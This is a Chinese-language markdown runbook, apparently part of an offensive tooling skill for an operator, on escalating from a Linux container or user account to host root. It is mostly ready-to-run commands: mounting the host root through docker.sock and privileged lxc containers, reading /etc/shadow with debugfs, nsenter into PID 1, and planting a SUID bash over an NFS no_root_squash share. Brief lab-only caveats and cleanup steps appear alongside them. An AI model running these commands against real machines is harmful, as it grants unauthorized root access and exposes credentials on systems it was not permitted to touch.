# 危险组 / docker.sock / 本机容器逃逸 / NFS

> **TECH：** 组权限、容器运行时套接字、privileged 挂载、NFS no_root_squash  
> **IMPACT：** **这台机器** 的 host root  
> **不是本文件：** Kubernetes RBAC、SA token 换集群权限、Copy Fail 的跨 Pod DaemonSet PoC → `/k8s`

操作者已经在容器里但选了 `/privesc-linux`：把本容器能打的 host 逃逸打完。看到 SA token 只记候选 `/k8s`。

---

## 0. 判断在哪

```bash
id
cat /proc/1/cgroup 2>/dev/null | head
ls -l /.dockerenv /run/.containerenv 2>/dev/null
ls -l /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null
hostname
mount | head
capsh --print 2>/dev/null
ls -l /var/run/docker.sock /run/containerd/containerd.sock /var/run/crio/crio.sock 2>/dev/null
```

---

## 1. docker 组 / 可写 docker.sock

组或 sock 对当前用户可写即可，不必两者都有。

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/bash
# 无 alpine 时
docker run -v /:/mnt --rm -it ubuntu chroot /mnt /bin/bash
```

成功：`chroot` 后 `cat /mnt/etc/shadow` 或直接 host 的 `id`。这是 host root。

没有 docker CLI、只有 sock：

```bash
curl --unix-socket /var/run/docker.sock http://localhost/info
# 再按 Docker HTTP API create/start 一个 -v /:/mnt 的容器
```

API 细节随版本变，先 `GET /info` 证明控制，再 create。

RESTORE：停并删测试容器 `docker rm -f <id>`。不要留特权容器。

---

## 2. containerd / CRI sock

```bash
ls -l /run/containerd/containerd.sock /var/run/crio/crio.sock
which nerdctl ctr crictl
```

能连 sock 时用当前工具 `--help`，不要硬套 docker CLI。目标同样是：起一个挂宿主根的容器或 `ctr run --mount`。

---

## 3. lxd / lxc 组

```bash
id | grep -E 'lxd|lxc'
lxc image list
```

经典：

```bash
lxc init ubuntu:22.04 c1 -c security.privileged=true
lxc config device add c1 hostdisk disk source=/ path=/mnt/root
lxc start c1
lxc exec c1 -- chroot /mnt/root /bin/bash
```

无现成镜像时用 alpine 或本地导入。`security.privileged=true` 是关键。失败看是否被 `security.nesting` / 策略拦住——那不是 EDR。

RESTORE：`lxc stop c1; lxc delete c1`。

---

## 4. disk / adm 组

```bash
# disk：裸设备
debugfs /dev/sda1
# debugfs: cat /etc/shadow
# 或
dd if=/dev/sda1 bs=1M count=64 of=/tmp/part.img
```

能写块设备则可种 SUID bash（破坏性大，授权靶场才做），更好的是读 shadow 打哈希再 `su`。

`adm`：读 `/var/log`，找密码、token。这是凭据线索，找到密码再 `su`/`sudo` 才算提权。

---

## 5. privileged 容器 / host 设备 / hostPID

已在容器内：

```bash
fdisk -l
lsblk
cat /proc/self/status | grep CapEff
```

能看见宿主分区：

```bash
mkdir -p /mnt/host
mount /dev/<HOST_PART> /mnt/host
chroot /mnt/host /bin/bash
```

hostPID + 足够 cap：

```bash
ps aux
nsenter -t 1 -m -u -i -n -p /bin/bash
```

`CAP_SYS_ADMIN` 可尝试 overlay/bind 宿主路径。失败看 seccomp：`grep Seccomp /proc/self/status`（2=严格）。seccomp 拦 AF_ALG 时 Copy Fail 也打不了，见 `kernel-lpe.md`。

cgroup v1 `release_agent` 仅当：cgroup v1、可写 release_agent、有 cap。现代 cgroup v2 默认当不可用。

```bash
mount | grep cgroup
cat /proc/filesystems | grep cgroup
```

---

## 6. NFS no_root_squash

```bash
cat /etc/exports
showmount -e TARGET
```

`no_root_squash`：

```bash
# 攻击机以 root
mount -o rw TARGET:/share /mnt
cp /bin/bash /mnt/rootbash
chmod 4755 /mnt/rootbash

# 目标
/share/rootbash -p
```

`root_squash` 时这条死。`all_squash` 也死。

RESTORE：删 `rootbash`，umount。

---

## 7. 和 /k8s 的边界（再强调）

```text
本文件做完：host root / 本机 docker 控制 / privileged 逃逸
本文件不做：kubectl create pod、RBAC bind、Copy Fail 的 K8s manifest
```

Copy Fail **作为本机 kernel LPE**（Python 打当前 kernel）→ `kernel-lpe.md`。  
Copy Fail **作为跨 Pod 打 node** → `../../k8s/references/container-escape.md`。
